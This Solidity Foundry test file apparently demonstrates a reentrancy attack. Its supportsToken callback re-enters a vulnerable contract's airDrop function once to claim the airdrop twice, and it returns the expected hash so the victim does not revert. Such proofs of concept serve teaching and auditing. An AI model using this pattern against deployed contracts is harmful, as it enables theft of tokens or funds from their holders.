// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Reentrancy.sol";
import "forge-std/console2.sol";

contract RentrancyTest is Test {

    ModifierEntrancy r;
    bool victimHasBeenCalled;

    function setUp() public {
        r = new ModifierEntrancy();
        victimHasBeenCalled = false;
    }

    function testAirdropOnce() public {
        uint balanceBefore = r.getBalance();
        console.log("Airdrop, balance before: %s", balanceBefore);
        r.airDrop();
        uint balanceAfter = r.getBalance();
        console.log("Airdrop, balance after: %s", balanceAfter);
    }

    function supportsToken() external returns(bytes32){
        console.log("Supports Token has been called by %s", msg.sender);
        if(!victimHasBeenCalled){
            console.log("about to call airdrop again");
            victimHasBeenCalled = true;
            // invoke airdrop for a second time
            r.airDrop();
        }
        // return desired response so victim contract doesn't throw
        return(keccak256(abi.encodePacked("Nu Token")));
    }

    function call(address token) public {
        console.log("call has ben invoked");
        r.airDrop();
    }

}
